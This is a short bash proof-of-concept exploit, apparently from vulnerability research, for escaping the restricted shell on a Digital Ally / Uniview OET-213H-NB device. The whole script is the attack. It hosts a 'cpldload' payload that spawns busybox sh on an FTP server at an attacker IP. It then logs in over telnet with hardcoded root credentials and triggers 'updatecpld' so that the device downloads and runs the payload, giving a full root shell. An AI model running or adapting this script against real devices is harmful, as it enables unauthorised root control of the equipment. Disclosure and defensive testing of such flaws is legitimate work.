#!/bin/bash
# PoC: Restricted Shell (uvsh) Escape via updatecpld
# Target: Digital Ally / Uniview OET-213H-NB
# Requires: FTP server with cpldload payload

ATTACKER_IP="${1:-192.168.30.13}"
TARGET="${2:-192.168.30.178}"
FTP_DIR="/tmp/ftp"

echo "[*] Setting up FTP server with escape payload"

# Create payload
mkdir -p "$FTP_DIR"
cat > "$FTP_DIR/cpldload" << 'EOF'
#!/bin/sh
/bin/busybox sh
EOF
chmod +x "$FTP_DIR/cpldload"

echo "[*] Starting FTP server on $ATTACKER_IP:21"
cd "$FTP_DIR" && python3 -m pyftpdlib -p 21 -w &
FTP_PID=$!
sleep 2

echo "[*] Triggering escape on $TARGET"
expect -c "
set timeout 30
spawn ncat $TARGET 23
expect -re \"login:\"
send \"root\r\"
expect -re \"assword:\"
send \"123456\r\"
expect -re \">\"
send \"updatecpld $ATTACKER_IP\r\"
expect -re \"\\$|#\"
puts \"\n[+] ESCAPED TO FULL SHELL\"
send \"id\r\"
expect -re \"\\$|#\"
send \"uname -a\r\"
expect -re \"\\$|#\"
send \"exit\r\"
expect eof
"

kill $FTP_PID 2>/dev/null
